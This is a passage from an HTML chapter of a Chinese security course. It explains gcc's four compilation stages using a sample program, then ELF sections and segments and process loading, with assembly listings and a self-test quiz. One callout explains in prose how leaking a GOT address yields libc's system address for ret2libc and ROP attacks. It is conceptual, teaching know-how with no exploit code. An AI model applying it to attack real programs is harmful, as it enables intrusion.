+    <p class="lead">这一章是全部溢出攻击的“地形图”。只要记住三件事——代码怎么变成机器指令、进程内存长什么样、函数调用时栈怎么长——后面的偏移计算就都是算术题。</p>
+
+    <h2>3.1 程序为什么会有（安全）bug</h2>
+    <p>课件用一条链表示四类失真点：</p>
+    <ul>
+      <li>程序想法 → 源代码：想法没被准确翻译（<em>Idea poorly translated to source code</em>）；</li>
+      <li>源代码 → 编译产物：编译器自身有 bug（<em>Compiler bugs</em>）；</li>
+      <li>编译产物 → 执行前：代码被篡改（<em>Code tampered with before execution</em>）；</li>
+      <li>执行中：代码或机器状态被篡改（<em>Code or machine state tampered with during execution</em>）。</li>
+    </ul>
+    <p>课件引用了 PLDI 2011 的《Finding and Understanding Bugs in C Compilers》与 GCC bug 42952 作为“编译器也会错”的实证：一个本应返回 0 的函数，在有 bug 的编译器版本下返回 1。因此编译器本身也需要测试：</p>
+    <ul>
+      <li><strong>差分测试</strong>：同一份源码用不同编译器编译，或同一编译器不同优化选项编译，比较输出是否相同。</li>
+      <li><strong>蜕变测试</strong>：利用应有性质构造等价输入，例如 <code>sin(x)</code> 与 <code>sin(x+2π)</code> 输出应相同；删除或乱序未被执行的代码，结果应不变。</li>
+    </ul>
+
+    <h2>3.2 编译四阶段：42.c 的一生</h2>
+    <p>本节只跟一个程序走：素材里的 <a href="src/42.c">42.c</a>，14 行代码（第 16–19 行是编译命令注释），做的事只有一件——把 <code>40+2</code> 算出来，交给 <code>answer()</code> 用 <code>printf</code> 打印。它旁边还躺着四个真实产物：<code>42.i</code>（38 232 字节）、<code>42.s</code>（1 128 字节）、<code>42.o</code>（1 192 字节）、<code>42</code>（7 368 字节）。</p>
+    <p>先给一句总纲：<strong>四个阶段不是四次“翻译”，而是四道“各自解决一个问题”的工序</strong>。把“问题”先摆出来，名词才有落点。</p>
+
+    <h3>3.2.1 四个阶段各自要解决什么问题</h3>
+    <ul>
+      <li><strong>预处理</strong>要解决：C 没有模块系统。函数声明散落在几百个头文件里，源码里只有一行 <code>#include</code>，编译器不可能自己去猜 <code>printf</code> 长什么样——所以先派一个“只会做文本替换”的程序，把所有该出现的文字都摆到同一个文件里。</li>
+      <li><strong>编译</strong>要解决：文本不等于语义。<code>x = 40 + 2</code> 对人是一句赋值，对机器只是一串字符；必须先切词、建树、检查类型，再变成与具体 CPU 无关的中间表示，才有地方做优化。</li>
+      <li><strong>汇编</strong>要解决：汇编助记符 CPU 不认。但这一步<strong>还不敢定地址</strong>——<code>printf</code> 在哪个库、最终落在哪个地址，此刻没人知道，于是产物里留空位，等链接来填。</li>
+      <li><strong>链接</strong>要解决：一个程序由很多 <code>.o</code> 和若干库组成。谁引用了谁、符号在哪、每个段最终放到哪个虚拟地址、外部依赖怎么接上——这些只有把所有碎片摆到一起才能回答。</li>
+    </ul>
+
+    <div class="pipe">
+      <div class="pipe-step"><b>① 预处理 cpp</b><span>42.c → 42.i<br>文本拼装：头文件、宏、条件编译</span></div>
+      <div class="pipe-arrow">→</div>
+      <div class="pipe-step"><b>② 编译 cc1</b><span>42.i → 42.s<br>语义分析 + 优化 + 生成汇编</span></div>
+      <div class="pipe-arrow">→</div>
+      <div class="pipe-step"><b>③ 汇编 as</b><span>42.s → 42.o<br>机器码 + 符号表 + 重定位表</span></div>
+      <div class="pipe-arrow">→</div>
+      <div class="pipe-step"><b>④ 链接 ld</b><span>42.o + 库 → 42<br>符号解析 + 地址分配 + 重定位</span></div>
+    </div>
+    <p class="mem-cap">图：四阶段流水线。箭头上的产物都真实存在于 <code>compile-42/</code> 目录，可直接用编辑器打开。</p>
+
+    <div class="table-wrap">
+      <table>
+        <tr><th>阶段</th><th>真实命令</th><th>产物（素材实测大小）</th><th>这一阶段结束时的状态</th></tr>
+        <tr><td>预处理</td><td><code>gcc -E 42.c -o 42.i</code></td><td>42.i：38 232 B / 2 084 行</td><td>一个完整的翻译单元，仍全是文本，一行机器码都没有</td></tr>
+        <tr><td>编译</td><td><code>gcc -S 42.c -o 42.s</code></td><td>42.s：1 128 B / 68 行</td><td>汇编文本，符号名还在，地址全是符号或 0</td></tr>
+        <tr><td>汇编</td><td><code>gcc -c 42.c -o 42.o</code></td><td>42.o：1 192 B</td><td>机器码就位，但 <code>answer</code> 的地址仍是 0，<code>printf</code> 仍是“未定义”</td></tr>
+        <tr><td>链接</td><td><code>gcc 42.c -o 42</code></td><td>42：7 368 B</td><td>可执行 ELF，入口 <code>0x8048310</code>，所有地址都已定死</td></tr>
+      </table>
+    </div>
+
+    <h3>3.2.2 第一步 预处理：把文本拼装完，别的什么都不干</h3>
+    <p>先讲它要避免的后果：如果编译器直接读 <code>42.c</code>，它看到的是 <code>#include &lt;stdio.h&gt;</code> 这一行，却不知道 <code>printf</code> 有几个参数、返回什么。要么编译器自己内置一套头文件知识（换个头文件就崩），要么先把头文件“抄”进来。C 选了后者。</p>
+    <p><a class="term" href="#g-cpp" data-term="g-cpp">预处理</a>（Preprocessing）：只按行首指令做文本替换、不检查语法，输出一个完整文件。类比：装修前把图纸上提到的所有材料清单摊在桌上，还没开始动工。此刻的 42.c：整个程序仍然可读，但被头文件“灌”成了 2 084 行——你自己的代码只在第 2075–2083 行。</p>
+    <ul>
+      <li><a class="term" href="#g-include" data-term="g-include">头文件包含</a>（<code>#include</code>）的本质是<strong>文本插入</strong>，不是“引用一个库”，也不是“链接”。所以两次包含同一个头文件就会得到两份声明，才需要 <code>#ifndef</code> 守卫。</li>
+      <li><a class="term" href="#g-macro" data-term="g-macro">宏展开</a>（Macro Expansion）同样是纯文本替换，没有类型、没有求值次数保证。<code>#define MAX(a,b) ((a)&gt;(b)?(a):(b))</code> 写成 <code>MAX(i++, j++)</code> 时，较大的那个参数会被加两次——这是“宏不是函数”的经典坑。</li>
+      <li><strong>条件编译</strong>（<code>#if / #ifdef / #else / #endif</code>）让同一份源码在不同平台生成不同内容；<code>#</code> 把参数变成字符串，<code>##</code> 把两个记号粘成一个新标识符。</li>
+    </ul>
+    <p>证据在这里：<code>42.i</code> 里能看到预处理器的“记账”方式——每切换回原文件就插一行 <code># 行号 "文件名"</code>，编译器靠它把错误信息报回 <code>42.c</code> 的真实行号。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">compile-42/42.i · 第 2069–2083 行（真实片段，已省略文件头）</span><span>预处理输出</span></div>
+      <pre data-lang="c"># 3 "42.c" 2
+
+# 6 "42.c"
+void answer(char * name, int x){
+ printf("%s, the answer is %d\n", name, x );
+}
+
+void main(int argc, char *argv[]){
+ int x;
+ x = 40 + 2;
+ answer(argv[1], x);
+}</pre>
+    </div>
+    <p>注意第 2081 行：源码里写的是 <code>x = NUMBER + 2;</code>，这里已经是 <code>x = 40 + 2;</code>——<code>NUMBER</code> 这个记号在预处理结束后<strong>彻底消失</strong>。这就是查看 <code>.i</code> 最有用的一点：宏展开后到底是什么样，一看便知。</p>
+    <p><a class="term" href="#g-tu" data-term="g-tu">翻译单元</a>（Translation Unit）：一个 <code>.c</code> 加上它包含的所有头文件，展开后的整体。一个翻译单元编译成一个 <code>.o</code>，这也是“一个 .c 一个目标文件”的由来。</p>
+
+    <h3>3.2.3 第二步 编译：把 C 的语义变成汇编</h3>
+    <p>要避免的后果：如果直接把字符映射成指令，<code>a*b+c</code> 和 <code>a*(b+c)</code> 会被同样处理，优化就无从谈起。所以编译器先把源码变成<strong>有结构的表示</strong>，再在这个结构上做检查与优化。</p>
+    <ol>
+      <li><a class="term" href="#g-token" data-term="g-token">词法单元</a>（Token）：把字符流切成“词”，如标识符 <code>answer</code>、字符串 <code>"%s, the answer is %d\n"</code>、运算符 <code>=</code>。类比：把一句话切成一个个词。</li>
+      <li><a class="term" href="#g-ast" data-term="g-ast">抽象语法树</a>（AST）：按语法把词组成树。<code>x = 40 + 2</code> 是一棵“赋值(变量, 加法(常量, 常量))”的树。类比：给句子划主谓宾。类型检查就在这棵树上做。</li>
+      <li><a class="term" href="#g-ir" data-term="g-ir">中间表示</a>（IR）：把树降成一种与 CPU 无关的规范形式（GCC 内部是 GIMPLE/RTL）。类比：先把中文翻成一份“翻译草稿”，再从草稿译成各国语言——优化就发生在草稿上。</li>
+      <li><strong>优化</strong>：在 IR 上做常量折叠、删除死代码、内联等；最后才选指令、分配寄存器，输出汇编。</li>
+    </ol>
+    <p>42.s 的真实开头就体现了“字符串常量单独放、代码放 .text”的分工：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">compile-42/42.s · 第 1–30 行（真实片段）</span><span>ASM (AT&amp;T)</span></div>
+      <pre data-lang="asm">	.file	"42.c"
+	.section	.rodata
+.LC0:
+	.string	"%s, the answer is %d\n"
+	.text
+	.globl	answer
+	.type	answer, @function
+answer:
+.LFB0:
+	.cfi_startproc
+	pushl	%ebp
+	movl	%esp, %ebp
+	subl	$8, %esp
+	subl	$4, %esp
+	pushl	12(%ebp)
+	pushl	8(%ebp)
+	pushl	$.LC0
+	call	printf
+	addl	$16, %esp
+	nop
+	leave
+	ret
+	.cfi_endproc
+.LFE0:
+	.size	answer, .-answer</pre>
+    </div>
+    <p>三点读法：① <code>.LC0</code> 是编译器给字符串起的内部标签，它被放进 <code>.rodata</code>（只读数据）；② <code>call printf</code> 只写了<strong>名字</strong>，没写地址；③ <code>.cfi_*</code> 是给调试器和异常展开用的帧描述，不产生指令，读汇编时可以跳过。</p>
+    <p>优化会改变你看到的汇编。同一段 <code>x = NUMBER + 2</code>，<code>-O0</code> 下是“先把 42 存进栈上的 x，再取出来”；<code>-O2</code> 下常量折叠后 42 直接进寄存器，甚至整个 <code>answer()</code> 被内联进 <code>main</code>。<strong>（-O2 的具体输出为示意，课件未展开优化细节；调试与算偏移一律用 -O0。）</strong></p>
+
+    <h3>3.2.4 第三步 汇编：机器码 + 两张“待办表”</h3>
+    <p>要避免的后果：汇编里 <code>call printf</code> 的 <code>printf</code> 只是一个名字，CPU 不认名字。汇编器能做的是把助记符翻成字节、把名字记进表里、把还不知道的地址留成空位。</p>
+    <p>42.o 的真实结构（用 ELF 解析读出，与 <code>readelf -S</code> / <code>nm</code> 等价）：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>项目</th><th>实测值</th><th>说明</th></tr>
+        <tr><td>文件大小 / 类型</td><td>1 192 B / ET_REL（可重定位）</td><td>还不是可执行文件，没有入口地址</td></tr>
+        <tr><td><code>.text</code></td><td>89 B，起始地址 0</td><td>两个函数的机器码，地址全是 0，等链接来摆</td></tr>
+        <tr><td><code>.rodata</code></td><td>22 B</td><td>正是 <code>"%s, the answer is %d\n"</code> 加结尾 0</td></tr>
+        <tr><td><code>.data</code> / <code>.bss</code></td><td>各 0 B</td><td>42.c 没有全局变量或静态变量，两节为空</td></tr>
+        <tr><td><code>.symtab</code></td><td>192 B，12 项</td><td><code>answer</code>（值 0，大小 31）、<code>main</code>（值 0x1f，大小 58）、<code>printf</code>（UND，未定义）</td></tr>
+        <tr><td><code>.rel.text</code></td><td>24 B，3 项</td><td>偏移 0x10（引用 .rodata）、0x15（引用 printf）、0x49（引用 answer）</td></tr>
+      </table>
+    </div>
+    <p><a class="term" href="#g-obj" data-term="g-obj">目标文件</a>（Object File）：已经含机器码、但地址与外部符号都还没定下来的中间文件。类比：零件已加工好，还没装配。</p>
+    <p><a class="term" href="#g-symtab" data-term="g-symtab">符号表</a>（Symbol Table）：记录“本文件定义了哪些名字、引用了哪些还不存在的名字”。<code>printf</code> 的 <code>shndx=0</code> 就是 UND——它在别的库里。</p>
+    <p><a class="term" href="#g-reloc" data-term="g-reloc">重定位</a>（Relocation）：指令里那些“待填的地址”及其填写规则。<code>42.o</code> 的 3 条记录正是三个空位。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">compile-42/42.o · .text 反汇编（89 字节，Intel 语法）</span><span>ASM</span></div>
+      <pre data-lang="asm">00000000: 55              push ebp
+00000001: 89e5            mov  ebp, esp
+00000003: 83ec08          sub  esp, 8
+00000006: 83ec04          sub  esp, 4
+00000009: ff750c          push dword [ebp+0xc]   ; 第 2 个参数 x
+0000000c: ff7508          push dword [ebp+0x8]   ; 第 1 个参数 name
+0000000f: 6800000000      push 0                 ; ← 空位：本应是 .LC0 的地址
+00000014: e8fcffffff      call 0x15              ; ← 空位：rel32 = -4，目标其实是“下一条”
+00000019: 83c410          add  esp, 0x10          ; 调用者清栈
+0000001c: 90              nop
+0000001d: c9              leave
+0000001e: c3              ret</pre>
+    </div>
+    <p>这两处“空位”就是本阶段最重要的观察点：<code>push 0</code> 里的 0 和 <code>call 0x15</code> 里的 -4 都不是最终代码，而是<strong>留给链接器填的坑</strong>。<code>0x15</code> 恰好是这条 call 的下一条指令地址，所以它的“相对位移 -4”只是占位，别无他意。</p>
+
+    <h3>3.2.5 第四步 链接：符号解析 + 地址分配 + 重定位</h3>
+    <p>要避免的后果：没有链接，每个 <code>.o</code> 都以为自己从 0 开始，两个 <code>.o</code> 都调用 <code>printf</code> 却各指一处，程序根本拼不起来。</p>
+    <p><a class="term" href="#g-link" data-term="g-link">链接</a>（Linking）：把多个目标文件与库合成一个整体，做三件事——<strong>符号解析</strong>（每个 UND 都找到定义）、<strong>地址分配</strong>（每个节放到哪个虚拟地址）、<strong>重定位</strong>（把空位改成最终值）。</p>
+    <p>成品 42 的真实结果（从 ELF 头与反汇编读出，与 <code>readelf -h</code> / <code>objdump -d</code> 等价）：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>符号 / 结构</th><th>42.o 里</th><th>42 里（链接后）</th></tr>
+        <tr><td><code>answer</code></td><td>地址 0，大小 31</td><td>地址 <code>0x804840b</code>，39 字节（含对齐）</td></tr>
+        <tr><td><code>main</code></td><td>地址 0x1f，大小 58</td><td>地址 <code>0x804842a</code></td></tr>
+        <tr><td><code>printf</code> 调用</td><td><code>call 0x15</code>（占位）</td><td><code>call 0x80482e0</code>（printf@plt）</td></tr>
+        <tr><td>格式串</td><td><code>push 0</code>（占位）</td><td><code>push 0x80484f0</code>（.rodata 内）</td></tr>
+        <tr><td>程序入口</td><td>无</td><td><code>0x8048310</code>（<code>_start</code>，来自 crt）</td></tr>
+      </table>
+    </div>
+    <p>静态链接与动态链接的差别，本质是“把库代码抄进来”还是“留个名字，运行时再找”：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>对比项</th><th>静态链接</th><th>动态链接（42 采用）</th></tr>
+        <tr><td>库代码</td><td>复制进可执行文件</td><td>不复制，运行时由加载器装入共享库</td></tr>
+        <tr><td>体积 / 依赖</td><td>体积大，但换机器照跑，不挑 libc 版本</td><td>体积小，但依赖目标机的 libc</td></tr>
+        <tr><td>外部函数地址</td><td>链接时就定死</td><td>第一次调用时才由动态加载器写入 GOT</td></tr>
+        <tr><td>漏洞利用的影响</td><td>地址稳定，便于写死 gadget</td><td>需先泄露库地址（ret2libc / ROP 的前提）</td></tr>
+      </table>
+    </div>
+    <p><a class="term" href="#g-dyn-link" data-term="g-dyn-link">动态链接</a>（Dynamic Linking）：可执行文件只记住“我要 printf”，真实地址运行时再填。这就必须有两张表配合——<a class="term" href="#g-plt" data-term="g-plt">过程链接表</a>（PLT）给调用方一个固定的“跳板”地址，<a class="term" href="#g-got" data-term="g-got">全局偏移表</a>（GOT）存放真实地址。</p>
+    <p>42 里的真实证据：<code>.plt</code> 共 48 B（0x80482d0 起的解析桩 + 两个函数桩），<code>printf@plt</code> 在 <code>0x80482e0</code>；对应的 GOT 槽位在 <code>0x804a00c</code>，初始值是 <code>0x80482e6</code>（指回 PLT 内部的解析代码），第一次调用后才被改写成 libc 里的真实地址。</p>
+    <p><code>undefined reference to 'printf'</code> 这句报错，说的正是<strong>符号解析失败</strong>：链接器在所有目标文件和库里都找不到 <code>printf</code> 的定义。常见原因：忘了链库、函数名拼错、只写了声明却没写实现（声明阶段不报错，链接阶段才炸）。</p>
+
+    <h3>3.2.6 同一段代码的四张面孔</h3>
+    <p>把四个产物摆在一起对照，是理解四阶段最快的办法。取 42.c 里的三样东西：宏、字符串、函数调用。</p>
+    <div class="table-wrap">
+      <table class="wide">
+        <tr><th>看什么</th><th>42.c（第 4、7、13 行）</th><th>42.i（2081 行）</th><th>42.s（第 3–4、20 行）</th><th>42.o / 42（机器码）</th></tr>
+        <tr><td>宏 <code>NUMBER</code></td><td><code>#define NUMBER 40</code></td><td>已变成字面量 <code>40</code></td><td><code>movl $42, -12(%ebp)</code>（常量已折叠）</td><td><code>c7 45 f4 2a 00 00 00</code></td></tr>
+        <tr><td>字符串</td><td><code>"%s, the answer is %d\n"</code></td><td>原样保留在源码行</td><td><code>.LC0: .string "...%d\n"</code>，放 <code>.rodata</code></td><td>22 字节常量；链接后落在 <code>0x80484f0</code></td></tr>
+        <tr><td>调用 printf</td><td><code>printf(...)</code></td><td>原样保留</td><td><code>call printf</code>（只有名字）</td><td>42.o：<code>call 0x15</code>（占位）；42：<code>call 0x80482e0</code></td></tr>
+        <tr><td>main 的返回值</td><td>无 <code>return</code></td><td>无</td><td>结尾 <code>leave; ret</code></td><td>函数末尾自动补出的返回序列</td></tr>
+      </table>
+    </div>
+    <p class="mem-cap">表：同一段语义在四个产物里的样子。42.i 行号、42.s 行号、42.o 字节与 42 地址均为实测；<code>-O0</code> 下 <code>42</code> 的常量折叠来自编译器默认行为。</p>
+
+    <h3>3.2.7 一个必须记住的结论：printf 的地址编译期不知道</h3>
+    <p>沿着上表最后一行往深里想一步：<strong>42.c 调用 printf 时，printf 的地址在编译期、甚至链接期都不是真正可用的地址</strong>。</p>
+    <ul>
+      <li>编译期：只有名字，<code>call printf</code> 连地址字段都没有；</li>
+      <li>汇编期：只有占位 <code>call 0x15</code>；</li>
+      <li>链接期：只能填成 PLT 跳板 <code>0x80482e0</code>，因为 libc 装到哪还不知道；</li>
+      <li>运行期：第一次调用进 PLT，动态加载器把 libc 里真正的 printf 地址写进 <code>0x804a00c</code>，之后才“直达”。</li>
+    </ul>
+    <div class="callout">
+      <b>为什么这决定了后面 ret2libc / ROP 能成立</b>
+      正因为 libc 的装载地址由加载器和 ASLR 决定，同一份程序在两次运行里 <code>system</code> 的地址都不同，所以攻击者不能“编译时写死”。但也正因为 libc 是<strong>整块</strong>装进来的，库内各函数的<strong>相对偏移固定</strong>：只要泄露任意一个已知函数的真实地址（比如通过 GOT 里的 printf），就能算出 system 的地址。这就是第 8 章 ret2libc 的出发点；而“只能靠 ret 结尾的小片段拼出调用链”，则是第 9 章 ROP 要解决的问题。
+    </div>
+
+    <h3>常见误解</h3>
+    <ul>
+      <li>「<code>gcc -c</code> 就是编译完成」——<code>-c</code> 只到 <code>.o</code>（汇编阶段），还差链接；<code>.o</code> 不能直接运行。</li>
+      <li>「<code>.i</code> 是精简后的源码」——恰好相反，它是被头文件灌满的<strong>膨胀版</strong>：42.c 的 14 行代码 → 42.i 2 084 行。</li>
+      <li>「头文件里就是库的实现」——头文件只有声明，实现（<code>printf</code> 的函数体）在 libc 里，靠链接或动态加载拿到。</li>
+      <li>「宏就是函数」——宏没有类型检查，也不保证只求值一次，<code>MAX(i++, j++)</code> 会出错。</li>
+      <li>「汇编阶段就把地址定死了」——<code>42.o</code> 的 <code>answer</code> 地址是 0，<code>printf</code> 是 UND，地址是链接器给的。</li>
+      <li>「链接错误等于代码写错了语法」——<code>undefined reference</code> 是链接器的抱怨，语法检查早就通过了。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 3.2 编译四阶段<span>4 题</span></div>
+
+      <div class="q" data-answer="B" data-explain="gcc -E 只跑预处理器：展开头文件、替换宏，输出 42.i（实测 2084 行）。-S 才生成汇编，-c 生成 .o，不带选项才链接成可执行文件。">
+        <div class="q-stem"><span class="qno">1.</span><code>gcc -E 42.c -o 42.i</code> 这一步做了什么？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-1" value="A"><span>A. 生成汇编代码 42.s</span></label>
+          <label class="opt"><input type="radio" name="q3-1" value="B"><span>B. 只做文本拼装：展开头文件、替换宏，得到 42.i</span></label>
+          <label class="opt"><input type="radio" name="q3-1" value="C"><span>C. 汇编成目标文件 42.o</span></label>
+          <label class="opt"><input type="radio" name="q3-1" value="D"><span>D. 链接生成可执行文件 42</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="#define MAX(a,b) ((a)>(b)?(a):(b)) 是纯文本替换，MAX(i++, j++) 会被展开成 ((i++)>(j++)?(i++):(j++))：较大者自增了两次，且比较里已经改过一次值。宏没有类型检查，也不保证参数只求值一次——这正是“宏不是函数”。">
+        <div class="q-stem"><span class="qno">2.</span>对 <code>#define MAX(a,b) ((a)&gt;(b)?(a):(b))</code>，调用 <code>MAX(i++, j++)</code> 的结果为什么不可靠？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-2" value="A"><span>A. 因为宏展开发生在链接阶段</span></label>
+          <label class="opt"><input type="radio" name="q3-2" value="B"><span>B. 因为宏只能用于整型</span></label>
+          <label class="opt"><input type="radio" name="q3-2" value="C"><span>C. 因为参数是纯文本替换、且会被求值不止一次</span></label>
+          <label class="opt"><input type="radio" name="q3-2" value="D"><span>D. 因为宏缺少返回值</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="42.o 的 .text 起始地址是 0，answer 符号值 0，printf 标为 UND：这些都是“可重定位”的证据。链接器要做符号解析、地址分配与重定位三件事，才把它们变成最终地址。">
+        <div class="q-stem"><span class="qno">3.</span>关于 42.o，下列哪项描述正确？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-3" value="A"><span>A. 它已经可以独立运行</span></label>
+          <label class="opt"><input type="radio" name="q3-3" value="B"><span>B. 它含机器码，但地址与外部符号尚未确定，需链接器处理</span></label>
+          <label class="opt"><input type="radio" name="q3-3" value="C"><span>C. 它的 .text 已被分配到 0x8048310</span></label>
+          <label class="opt"><input type="radio" name="q3-3" value="D"><span>D. 它里面没有 printf 的任何痕迹</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="D" data-explain="undefined reference 由链接器报告，含义是符号解析失败：所有 .o 与库里都找不到该符号的定义。语法错误在编译阶段就会报出；头文件缺失通常表现为“隐式声明”警告或在预处理阶段就失败。">
+        <div class="q-stem"><span class="qno">4.</span>编译时报 <code>undefined reference to 'foo'</code>，最准确的理解是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q3-4" value="A"><span>A. 源码有语法错误，编译器无法解析</span></label>
+          <label class="opt"><input type="radio" name="q3-4" value="B"><span>B. 头文件没有 include，预处理失败</span></label>
+          <label class="opt"><input type="radio" name="q3-4" value="C"><span>C. 宏展开失败，符号名被替换掉了</span></label>
+          <label class="opt"><input type="radio" name="q3-4" value="D"><span>D. 链接器在所有目标文件与库里都没找到该符号的定义</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <p class="callout ok"><b>下一节要用到这里的什么</b>链接器把 <code>.text</code>、<code>.rodata</code>、<code>.data</code> 摆进了固定的虚拟地址——这正是 3.3 要回答的“可执行文件被装进内存后长什么样”。而 <code>printf</code> 地址只有运行时才知道这一点，会在第 7 章（绕过防御）和第 8 章（ret2libc）里反复出现。</p>
+
+    <h2>3.3 可执行文件与进程内存</h2>
+    <p>上一节结束时，<code>42</code> 已经是一个“所有地址都定死”的 ELF 文件。本节要回答两件事：这个文件<strong>怎么被装进内存</strong>，以及装进去之后<strong>进程的地址空间长什么样</strong>。先把结论放这儿：文件里叫“节”，内存里叫“段”，函数调用在栈上留痕——后者就是第 4 章所有偏移计算的地基。</p>
+
+    <h3>3.3.1 ELF 是“格式”，不是“程序”</h3>
+    <p>要避免的后果：如果每个编译器、每个平台各自定义“代码放哪、数据放哪”，操作系统就得为每种产物写一套加载逻辑。于是有了一个统一契约。</p>
+    <p><a class="term" href="#g-elf" data-term="g-elf">ELF</a>（Executable and Linkable Format）：一种规定“代码、数据、符号、重定位怎么摆放”的文件格式规范。类比：集装箱标准——箱子里装什么由货主决定，但外形尺寸与吊装孔必须统一，港口才不用为每票货改造吊车。此刻的 42.c：<code>42.o</code> 是 <code>ET_REL</code>（可重定位，类型值 1），<code>42</code> 是 <code>ET_EXEC</code>（可执行，类型值 2）——同一个格式，两种用途。</p>
+    <p>“可执行文件”是<strong>用途</strong>，ELF 是<strong>格式</strong>。同一份 ELF 规范也用来描述 <code>.o</code> 和 <code>.so</code>，所以用同一个工具（readelf）就能看这三种东西。</p>
+
+    <h3>3.3.2 节与段：链接视图与执行视图</h3>
+    <p>困惑常出在这里：同一个 ELF 文件，<code>readelf -S</code> 列出 30 个节，<code>readelf -l</code> 只列出 9 个程序头、其中 2 个可加载段。两个数字都对，因为它们回答的是<strong>两个不同的问题</strong>。</p>
+    <ul>
+      <li><a class="term" href="#g-section" data-term="g-section">节</a>（Section）：链接时关心的分类单位，如 <code>.text</code>、<code>.rodata</code>、<code>.data</code>、<code>.symtab</code>。<code>readelf -S</code> 看的是<strong>节区头表</strong>：每个节叫什么、多大、在文件哪个偏移、属于哪一类。它服务于“链接器怎么拼”。</li>
+      <li><a class="term" href="#g-segment" data-term="g-segment">段</a>（Segment）：运行时关心的映射单位，一个段把若干<strong>权限相同</strong>的节包在一起。<code>readelf -l</code> 看的是<a class="term" href="#g-phdr" data-term="g-phdr">程序头表</a>（Program Header Table）：每段从文件哪里开始、装到哪个虚拟地址、给读/写/执行中的哪些权限。它服务于“内核怎么装”。</li>
+    </ul>
+    <p>42 的实测对应关系（真实值）：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>可加载段（readelf -l）</th><th>文件范围 → 虚拟地址</th><th>权限</th><th>包含哪些节（readelf -S）</th></tr>
+        <tr><td>LOAD #1</td><td>off 0x0 → <code>0x8048000</code>，filesz 0x628</td><td>R + X（flags=5）</td><td>.interp、.init、<code>.plt</code>、<code>.text</code>、.fini、<code>.rodata</code>、.eh_frame</td></tr>
+        <tr><td>LOAD #2</td><td>off 0xf08 → <code>0x8049f08</code>，filesz 0x114，memsz 0x118</td><td>R + W（flags=6）</td><td>.init_array、.fini_array、.dynamic、<code>.got</code>、<code>.got.plt</code>、<code>.data</code>、<code>.bss</code></td></tr>
+        <tr><td>其余 7 项</td><td>PT_INTERP / PT_NOTE / PT_DYNAMIC / PT_GNU_STACK 等</td><td>—</td><td>不是代码段，只给加载器与运行时用</td></tr>
+      </table>
+    </div>
+    <p>请特别看一眼第二行的两个数：<code>filesz 0x114</code> 与 <code>memsz 0x118</code>，差 4 字节——这 4 字节正是 <code>.bss</code> 的大小（<code>0x804a01c</code> 起 4 B）。<strong>文件里没有这 4 字节，内存里却要有</strong>，这个差值就是“bss 不占磁盘”的直接证据。</p>
+
+    <h3>3.3.3 从磁盘到内存：execve 做了哪几步</h3>
+    <p>要避免的后果：如果直接把文件内容按原样读进内存、从第一字节开始执行，那么“代码放哪”就由文件布局决定，任何两个程序都会撞地址。所以要有一套“按虚拟地址摆放”的规则。</p>
+    <ol>
+      <li><strong>execve</strong> 系统调用：内核接管，读 ELF 头，确认格式与类型。</li>
+      <li><strong>新建地址空间</strong>：给这个进程一套全新的虚拟地址空间（隔离的前提）。</li>
+      <li><strong>按程序头表映射</strong>：对每个 <code>PT_LOAD</code>，用 mmap 把“文件偏移区间”映射到“虚拟地址区间”，权限按段头设置。<a class="term" href="#g-page" data-term="g-page">页</a>（Page，常见 4 KB）是映射的最小单位，段的 <code>p_align</code> 正是 <code>0x1000</code>。</li>
+      <li><strong>建立栈与环境</strong>：把 <code>argc</code>、<code>argv</code>、<code>envp</code> 压到新栈顶，再放辅助向量。</li>
+      <li><strong>跳到入口</strong>：42 的入口是 <code>0x8048310</code>，即 <code>_start</code>。</li>
+      <li><strong>_start → __libc_start_main → main</strong>：<code>_start</code> 把 <code>main</code> 的地址当参数交给 libc，由 libc 完成初始化后才调用 <code>main</code>。</li>
+    </ol>
+    <div class="code-block">
+      <div class="code-head"><span class="src">compile-42/42 · _start 反汇编（入口 0x8048310，Intel 语法）</span><span>ASM</span></div>
+      <pre data-lang="asm">08048310: 31ed           xor  ebp, ebp
+08048312: 5e             pop  esi              ; argc
+08048313: 89e1           mov  ecx, esp         ; argv 起点
+08048315: 83e4f0         and  esp, 0xfffffff0  ; 16 字节对齐
+08048318: 50             push eax
+08048319: 54             push esp
+0804831a: 52             push edx
+0804831b: 68d0840408     push 0x80484d0        ; fini
+08048320: 6870840408     push 0x8048470        ; init
+08048325: 51             push ecx              ; argv
+08048326: 56             push esi              ; argc
+08048327: 682a840408     push 0x804842a        ; ← main 的地址
+0804832c: e8bfffffff     call 0x80482f0        ; __libc_start_main@plt
+08048331: f4             hlt</pre>
+    </div>
+    <p><code>0x804842a</code> 就是 <code>main</code> 的入口——这才是程序真正的起点。<strong>你写的 <code>main</code> 并不是进程的第一条指令</strong>，在它之前还有 <code>_start</code>、libc 初始化、<code>.init_array</code> 里的构造器。</p>
+    <p>“文件偏移怎么变成虚拟地址”，公式就一句话：<code>虚拟地址 = p_vaddr + (文件偏移 − p_offset)</code>。42 的 RX 段 <code>p_vaddr − p_offset = 0x8048000</code>，所以：</p>
+    <div class="table-wrap">
+      <table>
